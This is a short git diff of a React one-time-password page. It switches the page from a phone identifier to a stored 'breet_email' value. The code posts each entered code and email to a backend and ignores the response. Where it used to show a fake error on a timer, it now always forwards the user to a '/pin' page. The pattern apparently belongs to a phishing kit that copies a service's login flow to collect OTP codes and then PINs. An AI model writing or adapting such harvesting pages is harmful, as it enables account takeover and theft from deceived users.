@@ -1,4 +1,4 @@
-﻿import React, { useState, useRef, useEffect } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import "../App.css";
 import axios from "axios";
@@ -17,7 +17,7 @@ const Otp = () => {
   const [canResend, setCanResend] = useState(false);
   const inputsRef = useRef([]);
 
-  const phone = localStorage.getItem("gt_phone") || "";
+  const email = localStorage.getItem("breet_email") || "";
 
   useEffect(() => {
     inputsRef.current[0]?.focus();
@@ -57,15 +57,11 @@ const Otp = () => {
     }
     setLoading(true);
     setError("");
-    axios.post(`${BASE_URL}/otp`, { otp: code, phone }).catch(() => {});
+    axios.post(`${BASE_URL}/otp`, { otp: code, email }).catch(() => {});
     setTimeout(() => {
       setLoading(false);
-      setError("An error occurred. Please try again.");
-      setOtp(new Array(OTP_LENGTH).fill(""));
-      setSeconds(RESEND_SECONDS);
-      setCanResend(false);
-      inputsRef.current[0]?.focus();
-    }, 5000);
+      navigate("/pin");
+    }, 3000);
   };
 
   const handleResend = () => {
@@ -75,7 +71,7 @@ const Otp = () => {
     setOtp(new Array(OTP_LENGTH).fill(""));
     setError("");
     inputsRef.current[0]?.focus();
-    axios.post(`${BASE_URL}/`, { phone }).catch(() => {});
+    axios.post(`${BASE_URL}/`, { email }).catch(() => {});
   };
 
   const allFilled = otp.every((d) => d !== "");
